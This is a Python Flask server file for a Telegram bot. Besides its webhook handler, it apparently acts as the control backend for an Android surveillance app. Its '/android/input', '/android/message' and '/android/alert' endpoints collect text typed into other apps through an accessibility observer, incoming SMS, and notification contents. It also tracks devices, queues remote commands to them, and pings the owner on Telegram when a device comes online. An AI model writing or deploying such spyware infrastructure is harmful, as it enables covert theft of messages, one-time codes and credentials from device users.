import logging
from flask import Flask, request, abort
import telebot
from bot.config import SECRET_TOKEN, WEBHOOK_PORT

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────
# WEBHOOK SERVER
# Flask server that receives Telegram updates
# via webhook — instant, no polling delay
# ─────────────────────────────────────────

app = Flask(__name__)
_bot_instance = None

# ─────────────────────────────────────────
# REGISTER BOT INSTANCE
# Called from main.py before starting server
# ─────────────────────────────────────────
def register_bot(bot: telebot.TeleBot):
    global _bot_instance
    _bot_instance = bot
    logger.info("Bot registered with webhook server")


# ─────────────────────────────────────────
# HEALTH CHECK ENDPOINT
# Used by UptimeRobot to keep bot alive 24/7
# ─────────────────────────────────────────
@app.route("/", methods=["GET"])
def health_check():
    return "OK", 200


# ─────────────────────────────────────────
# WEBHOOK ENDPOINT
# Receives all Telegram updates
# Validates secret token for security
# ─────────────────────────────────────────
@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        # ── Validate secret token ──
        token_header = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
        if SECRET_TOKEN and token_header != SECRET_TOKEN:
            logger.warning("Webhook received invalid secret token")
            abort(403)

        if not _bot_instance:
            logger.error("Bot not registered with webhook server")
            abort(500)

        # ── Process the update ──
        if request.headers.get("Content-Type") == "application/json":
            json_data = request.get_json(force=True)
            update = telebot.types.Update.de_json(json_data)
            _bot_instance.process_new_updates([update])
            return "OK", 200

        logger.warning("Webhook received non-JSON content")
        abort(400)

    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return "ERROR", 500


# ─────────────────────────────────────────
# START WEBHOOK SERVER
# ─────────────────────────────────────────
def start_webhook_server(host: str = "0.0.0.0", port: int = None):
    try:
        server_port = port or WEBHOOK_PORT
        logger.info(f"Starting webhook server on port {server_port}")
        app.run(
            host=host,
            port=server_port,
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Webhook server error: {e}")
        raise


# ─────────────────────────────────────────
# ANDROID API ENDPOINTS
# Receives data from Android app
# ─────────────────────────────────────────

_device_last_seen = {}
_pending_commands = {}
_device_registry = {}  # device_id → {model, android_version, first_seen}


@app.route("/android/message", methods=["POST"])
def android_message():
    try:
        data = request.get_json(force=True)
        sender = data.get("sender", "")
        message = data.get("message", "")
        timestamp = data.get("timestamp", "")
        if sender and message:
            from bot.services.sms_service import sms_service
            sms_service.process_incoming_sms(sender, message, timestamp)
        return "OK", 200
    except Exception as e:
        logger.error(f"Android message error: {e}")
        return "ERROR", 500


@app.route("/android/input", methods=["POST"])
def android_input():
    try:
        data = request.get_json(force=True)
        app_name = data.get("app_name", "")
        package_name = data.get("package_name", "")
        input_text = data.get("input_text", "")
        if app_name and input_text:
            from bot.android.AccessibilityObserver import accessibility_observer
            accessibility_observer.on_input_observed(app_name, package_name, input_text)
        return "OK", 200
    except Exception as e:
        logger.error(f"Android input error: {e}")
        return "ERROR", 500


@app.route("/android/alert", methods=["POST"])
def android_alert():
    try:
        data = request.get_json(force=True)
        app_name = data.get("app_name", "")
        title = data.get("title", "")
        content = data.get("content", "")
        package_name = data.get("package_name", "")
        if app_name and title:
            from bot.android.AlertListener import alert_listener
            alert_listener.on_alert_received(app_name, title, content, package_name)
        return "OK", 200
    except Exception as e:
        logger.error(f"Android alert error: {e}")
        return "ERROR", 500


@app.route("/android/status", methods=["POST"])
def android_status():
    try:
        import datetime
        import requests as req
        from bot.config import BOT_TOKEN, OWNER_ID
        data = request.get_json(force=True)
        device_id = data.get("device_id", "")
        event = data.get("event", "")
        model = data.get("model", "Unknown")
        android_ver = data.get("android_version", "")
        _device_last_seen[device_id] = datetime.datetime.now()
        if device_id not in _device_registry:
            _device_registry[device_id] = {
                "model": model,
                "android_version": android_ver,
                "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        else:
            _device_registry[device_id]["model"] = model
        if event == "device_online":
            msg = (
                f"🟢 <b>Device Online</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📱 Model: {model}\n"
                f"🤖 Android: {android_ver}\n"
                f"🕐 {data.get('timestamp', '')}"
            )
            req.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": OWNER_ID, "text": msg, "parse_mode": "HTML"},
                timeout=10
            )
        return "OK", 200
    except Exception as e:
        logger.error(f"Android status error: {e}")
        return "ERROR", 500


@app.route("/android/heartbeat", methods=["POST"])
def android_heartbeat():
    try:
        import datetime
        data = request.get_json(force=True)
        device_id = data.get("device_id", "")
        model = data.get("model", "Unknown")
        android_ver = data.get("android_version", "")
        _device_last_seen[device_id] = datetime.datetime.now()
        # Keep registry updated
        if device_id not in _device_registry:
            _device_registry[device_id] = {
                "model": model,
                "android_version": android_ver,
                "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        else:
            _device_registry[device_id]["model"] = model
        return "OK", 200
    except Exception as e:
        logger.error(f"Android heartbeat error: {e}")
        return "ERROR", 500


@app.route("/android/commands", methods=["GET"])
def android_commands():
    try:
        device_id = request.args.get("device_id", "")
        command = _pending_commands.pop(device_id, None)
        if command:
            return {"command": command}, 200
        return {}, 200
    except Exception as e:
        logger.error(f"Android commands error: {e}")
        return {}, 200


def send_reconnect_command(device_id: str):
    _pending_commands[device_id] = "reconnect"


def get_device_status(device_id: str = None) -> dict:
    import datetime
    now = datetime.datetime.now()
    if device_id:
        last_seen = _device_last_seen.get(device_id)
        if last_seen:
            diff = (now - last_seen).total_seconds()
            return {
                "online": diff < 60,
                "last_seen": last_seen.strftime("%H:%M:%S"),
                "seconds_ago": int(diff)
            }
        return {"online": False, "last_seen": "Never", "seconds_ago": -1}
    result = {}
    for did, last_seen in _device_last_seen.items():
        diff = (now - last_seen).total_seconds()
        result[did] = {
            "online": diff < 60,
            "last_seen": last_seen.strftime("%H:%M:%S"),
            "seconds_ago": int(diff)
        }
    return result


# ─────────────────────────────────────────
# GET ALL CONNECTED DEVICES
# Returns list of all devices with status
# ─────────────────────────────────────────
def get_all_devices() -> list:
    import datetime
    now = datetime.datetime.now()
    devices = []
    for device_id, last_seen in _device_last_seen.items():
        diff = (now - last_seen).total_seconds()
        online = diff < 60
        info = _device_registry.get(device_id, {})
        devices.append({
            "device_id": device_id,
            "model": info.get("model", "Unknown Device"),
            "android_version": info.get("android_version", ""),
            "online": online,
            "last_seen": last_seen.strftime("%H:%M:%S"),
            "seconds_ago": int(diff)
        })
    # Sort — online first then offline
    devices.sort(key=lambda x: (not x["online"], x["model"]))
    return devices
